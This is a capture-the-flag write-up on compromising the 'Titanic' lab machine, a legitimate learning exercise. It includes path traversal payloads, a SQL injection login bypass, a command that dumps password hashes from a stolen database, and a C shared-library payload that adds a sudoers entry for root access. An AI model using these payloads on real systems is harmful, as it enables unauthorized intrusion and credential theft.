# 🚢Titanic

## 🧠Summary 
> Using basics of web enumeration to find the vulnerable subdomain which leads access to the
> machine using SSH(secure shell). In the machine, found a vulnerable file identify_image.sh, so introduced a
> C program for gaining root access.
  ```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```
## 🔍Step 1 (Nmap scan)
- Did a nmap scan to determine the open ports in the machine
  ```bash
  nmap -sV -v {ip address}
  ```
- Note: Using the sV flag is for version detection which is always useful because we can search in the web for past vulnerablity of that version
- The result of the nmap scan is in this link 👉 [nmap_scan_result](./analysed_data/nmap_scan.txt)
## 💡Step 2 (Web analysis)
- Before starting analysis, updated the etc/hosts
  ```bash
  sudo echo "{ip address}    titanic.htb" > etc/hosts
  ```
- Registred in the site to see output and found out that you can directly download things from the site
## 💻Step 3 (Enumeration)
- Used a custom made python script and wordlist that aling mostly to tourism and booking site
- custom python script 👉 [enumeration.py](./custom_tool/enumeration.py)
- Found out that 2 addtional webpages are present, that is the "book" and "download"
- Did some manual enumeration using the earlier data and found out that /download?ticket= is an endpoint
- For further analysis used burp suite and dirsearch and conformed that there was subdomain called dev.titanic.htb (☠️note: unfortuanately couldn't capture the records of burp suite)
- While doing the analysis using burp suite in the newly found endpoint used some payloads like ../../../etc/passwd and found a file
- the file received from the payload 👉 [etc/passwd.txt](./analysed_data/ticket.txt)
- Notice that there is a user called as developer
- To get the user flag we use a payload ../../../home/developer/user.txt to obtain the flag
- In the dev.titanic.htb subdomian we found the application used is gitea to upload 2 git repository
## 📖Step 4 (Info gathering)
- I entered gitea using the username developer we found and then tried to login but no password
    - tried:
    >  1) guess some random password (failed).
    >  2) Did some simple sql injection using the payload developer'# (success)
- Then analysed the git hub repose and found the path way to the database
- Then downloaded the database using the endpoint download?ticket=
- The obtained database 👉 [database](./analysed_data/developer_db.db)
## 🔐Step 5 (Brute-forcing)
- Using the bash command
  ```bash
  sqlite3 {name_of_database} "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee hashes.txt
  ```
- The above shown output will be saved to a hashes.txt file 👉 [hashes.txt](./analysed_data/hashes.txt)
- As we analyzed the hash, found out that this is a pkbdf2 hash with salt and has undergone 50000 iteration, so i wrote a custom python program and used rockyou.txt
- custom python program 👉 [hash_decode.py](./custom_tool/hash_decode.py)
## 📎Step 6 (Foothold)
- Using the username "developer" and the cracked password we login to the machine using SSH
  ```bash
  ssh developer@titanic.htb
  ```
- After that searched through the files to find identify_images.sh which is using imageMagick to identify picture and write it in log files quickly
- So in the directory /opt/app/static/assets/images/ I introduced a new file exploit.c and wrote the above c code
- I compiled and ran the code as
  ```bash
  gcc -fPIC -shared -o ./libxcb.so.1 exploit.c -nostartfiles
  ```
- Then executed sudo su and finally I became root
- I got the root flag in the root directory using
  ```bash
  cat root/root.txt
  ```
  
